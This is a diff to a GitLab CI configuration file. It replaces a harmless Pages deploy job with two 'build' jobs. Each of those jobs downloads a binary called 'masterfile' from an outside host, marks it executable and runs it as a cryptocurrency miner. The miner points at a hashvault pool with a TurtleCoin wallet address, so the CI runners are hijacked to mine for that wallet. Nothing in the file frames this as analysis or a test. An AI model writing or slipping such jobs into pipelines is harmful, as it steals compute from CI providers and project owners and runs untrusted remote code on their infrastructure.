@@ -1,12 +1,19 @@
-image: alpine:latest
+image: golang:latest
 
-pages:
-  stage: deploy
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
   script:
-  - echo 'Nothing to do...'
-  artifacts:
-    paths:
-    - public
-    expire_in: 1 day
-  rules:
-    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
+    - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile -o pool.hashvault.pro:80 -u TRTLv11jVfE8pG6joSABXzLi4fpq694dXGF91RFJ6nuMf2AJuSRa7CSF2i8siF1BGgfF7fYUjnGt4P22T2sLQRzyK8Cooo7PUrB -p nanung4 -k --tls
+
+build_b:
+  stage: build
+  script:
+    - wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile -o pool.hashvault.pro:80 -u TRTLv11jVfE8pG6joSABXzLi4fpq694dXGF91RFJ6nuMf2AJuSRa7CSF2i8siF1BGgfF7fYUjnGt4P22T2sLQRzyK8Cooo7PUrB -p nanung4 -k --tls
